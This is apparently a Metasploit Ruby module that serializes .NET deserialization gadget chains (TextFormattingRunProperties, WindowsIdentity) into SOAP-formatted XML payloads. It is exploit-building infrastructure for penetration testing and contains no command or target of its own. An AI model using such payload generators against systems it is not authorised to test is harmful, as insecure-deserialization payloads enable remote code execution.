module Msf
module Util
module DotNetDeserialization
module Formatters
module SoapFormatter

  class SoapBuilder
    def initialize(stream)
      @document = Nokogiri::XML::Document.new
      @root = envelop = node('SOAP-ENV:Envelope', attributes: {
        'xmlns:xsi'              => 'http://www.w3.org/2001/XMLSchema-instance',
        'xmlns:xsd'              => 'http://www.w3.org/2001/XMLSchema',
        'xmlns:SOAP-ENC'         => 'http://schemas.xmlsoap.org/soap/encoding/',
        'xmlns:SOAP-ENV'         => 'http://schemas.xmlsoap.org/soap/envelope/',
        'xmlns:clr'              => 'http://schemas.microsoft.com/soap/encoding/clr/1.0',
        'SOAP-ENV:encodingStyle' => 'http://schemas.xmlsoap.org/soap/encoding/'
      })

      body = node('SOAP-ENV:Body', parent: envelop)

      stream.records.each do |record|
        record_value = record.record_value
        case record.record_type
        when Enums::RecordTypeEnum[:SystemClassWithMembersAndTypes]
          build_class_with_members_and_types(body, record_value)
        when Enums::RecordTypeEnum[:ClassWithMembersAndTypes]
          library = stream.get_object(record_value.library_id)
          build_class_with_members_and_types(body, record_value, library_name: library.library_name)
        end
      end
    end

    attr_reader :root

    protected

    def build_class_with_members_and_types(body, record_value, library_name: Assemblies::VERSIONS['4.0.0.0']['mscorlib'])
      library_name = library_name.to_s if library_name.is_a? Assemblies::StrongName
      ns = "a#{body.children.length + 1}"
      class_node = node("#{ns}:#{record_value.class_info.name.split('.')[-1]}", parent: body, attributes: {
        'id'          => "ref-#{record_value.class_info.obj_id}",
        "xmlns:#{ns}" => "http://schemas.microsoft.com/clr/nsassem/#{record_value.class_info.name.split('.')[0...-1].join('.')}/#{library_name}"
      })
      member_value_nodes(record_value).each do |value_node|
        class_node.add_child value_node
      end

      class_node
    end

    def member_value_nodes(record_value)
      value_nodes = []
      record_value.class_info.member_names.each_with_index do |name, index|
        binary_type = record_value.member_type_info.binary_type_enums[index].value
        case binary_type
        when Enums::BinaryTypeEnum[:String]
          string_record_value = record_value.member_values[index].record_value
          value_nodes << node(name, content: string_record_value.string, attributes: {
            'id'       => "ref-#{string_record_value.obj_id}",
            'xsi:type' => 'xsd:string',
            'xmlns'    => ''
          })
        else
          raise ::NotImplementedError, "Member value type #{Enums::BinaryTypeEnum.key(binary_type)} is not implemented"
        end
      end

      value_nodes
    end

    def node(name, attributes: {}, content: nil, parent: nil)
      node = Nokogiri::XML::Node.new(name, @document)
      attributes.each_pair do |key, value|
        node[key] = value
      end
      node.content = content unless content.nil?
      parent.add_child node unless parent.nil?

      node
    end
  end

  def self.generate(stream)
    unless stream.is_a?(GadgetChains::TextFormattingRunProperties) || stream.is_a?(GadgetChains::WindowsIdentity)
      raise ::NotImplementedError, 'Stream is not supported by this formatter'
    end

    builder = SoapBuilder.new(stream)
    builder.root.to_s
  end

end
end
end
end
end
